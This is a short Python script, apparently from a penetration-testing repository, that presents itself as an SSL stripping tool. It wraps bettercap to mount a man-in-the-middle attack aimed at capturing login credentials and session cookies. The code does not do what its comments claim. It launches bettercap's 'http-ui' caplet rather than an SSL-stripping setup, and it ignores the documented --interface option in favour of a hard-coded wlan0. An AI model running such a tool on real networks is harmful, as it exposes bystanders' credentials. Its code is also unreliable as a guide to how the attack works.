import subprocess

# ssl_stripper.py
#
# Description:
# ------------
# ssl_stripper.py is a Python script designed to perform an SSL stripping attack, which
# attempts to downgrade HTTPS connections to HTTP by intercepting and modifying traffic
# between a client and server. This type of attack allows a malicious actor to capture
# sensitive information such as login credentials and session cookies in plain text.
# The script utilizes a tool like `bettercap` to set up a Man-In-The-Middle (MITM) attack
# and implement SSL stripping. It is useful for penetration testers and security researchers
# to test the resilience of networks and web applications against SSL stripping attacks.
#
# Usage:
# ------
# The script can be executed directly from the command line. You must specify the network
# interface that will be used for the MITM attack. The script initiates SSL stripping using
# `bettercap` or another similar utility configured for this purpose.
#
# Example: Run the script to perform SSL stripping on a specific interface
#   python ssl_stripper.py --interface wlan0
#
# Ensure that the specified network interface is active and configured correctly for the attack.
#
# Dependencies:
# -------------
# - Python 3.x: Ensure Python is installed on your system.
# - bettercap: A powerful, flexible tool for network attacks and monitoring. It must be installed
#   on your system. Install bettercap using your package manager (e.g., apt-get, yum) or by following
#   the instructions on the official website: https://www.bettercap.org/
# - Network Interface: A network interface capable of being configured for MITM attacks. This interface
#   will be used to intercept and manipulate network traffic.
#
# Configuration:
# --------------
# - Ensure bettercap is properly installed and configured on your system. You may need to run bettercap
#   with elevated privileges (e.g., using sudo) to execute the attack.
# - Customize the bettercap configuration as needed to specify additional parameters or to target
#   specific hosts within the network.
#
# Notes:
# ------
# - SSL stripping is an active attack that may be illegal or unethical in some jurisdictions.
#   Use this script only in controlled environments where you have explicit permission to conduct
#   penetration testing and security research.
# - The script requires root privileges to run bettercap and perform MITM attacks. Ensure you
#   execute the script with the necessary permissions (e.g., using sudo).
# - Be aware of the ethical implications and potential legal consequences of performing SSL
#   stripping attacks. Always adhere to ethical guidelines and obtain proper authorization before
#   conducting security testing.
#
# Author: brkn404
# Date: 2024-08-28

def check_bettercap_installed():
    """
    Check if bettercap is installed on the system by trying to run the bettercap version command.

    This function runs 'bettercap --version' to check if bettercap is installed. If the command fails,
    it prints an error message and exits the script.
    """
    try:
        subprocess.run(["bettercap", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[INFO] bettercap is installed and available.")
    except subprocess.CalledProcessError:
        print("[ERROR] bettercap is not installed or not found in PATH. Please install bettercap to use this script.")
        exit(1)

def ssl_strip(interface):
    """
    Start an SSL stripping attack using bettercap on the specified network interface.

    This function invokes bettercap to perform a Man-In-The-Middle (MITM) attack with SSL
    stripping. It uses the specified network interface to intercept and modify HTTPS traffic,
    attempting to downgrade secure connections to plain HTTP.

    Args:
        interface (str): The network interface to use for the MITM attack (e.g., "wlan0").
    """
    check_bettercap_installed()
    print("[INFO] Starting SSL Strip attack using bettercap.")
    try:
        subprocess.run(["bettercap", "-iface", interface, "-caplet", "http-ui"], check=True)
        print(f"[INFO] SSL Strip attack started on interface {interface}.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to start SSL Strip attack: {e}")

# Example usage
if __name__ == "__main__":
    interface = "wlan0"  # Default network interface for the MITM attack
    ssl_strip(interface)



